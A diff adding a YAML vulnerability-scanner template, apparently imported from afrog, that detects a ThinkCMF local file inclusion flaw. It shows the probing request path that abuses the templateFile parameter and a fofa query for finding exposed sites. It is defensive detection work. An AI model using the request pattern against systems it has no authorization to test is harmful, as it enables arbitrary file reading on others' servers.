@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ThinkCMF
+          - '## README'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/?a=display&templateFile=README.md'
+id: thinkcmf-lfi
+info:
+  author: JerryKing
+  description: |
+    Thinkcmf 存在本地文件包含漏洞，攻击者可利用漏洞读取服务器上的任意文件。
+    fofa: title=="ThinkCMF"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Thinkcmf lfi
+  severity: high
+  tags: thinkcmf,lfi,argus-import
